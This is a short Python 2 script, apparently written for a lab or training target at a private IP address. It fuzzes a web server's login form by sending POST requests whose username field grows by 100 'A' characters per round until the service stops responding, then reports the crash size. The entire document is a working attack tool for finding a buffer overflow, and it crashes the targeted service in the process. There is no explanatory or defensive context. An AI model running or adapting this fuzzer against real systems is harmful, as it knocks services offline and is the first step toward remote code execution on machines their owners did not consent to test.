#!/usr/bin/env python2

import sys, socket
from time import sleep

ip = "192.168.153.10"
port = 80

buffer= "A" * 100
while True:
        try:
                content = "username=" + buffer + "&password=A"
                req = "POST /login HTTP/1.1\r\n"
                req+= "Host: 192.168.153.10\r\n"
                req+= "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
                req+= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                req+= "Accept-Language: en-US,en;q=0.5\r\n"
                req+= "Accept-Encoding: gzip, deflate\r\n"
                req+= "Content-Type: application/x-www-form-urlencoded\r\n"
                req+= "Content-Length: "+ str(len(content)) + "\r\n"
                req+= "Origin: http://192.168.153.10\r\n"
                req+= "Connection: close\r\n"
                req+= "Referer: http://192.168.153.10/login\r\n"
                req+= "Upgrade-Insecure-Requests: 1\r\n"
                req+= "\r\n"
                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                s.connect((ip, port))
                print "Fuzzing with %s bytes..." % str(len(buffer))
                s.send((req + content))
                sleep(10)
                buffer = buffer + "A" * 100
                content = "username=" + buffer + "&password=A"
        except:
                print "Connection error! Fuzzing crashed at %s bytes" % str(len(buffer))
                sys.exit()
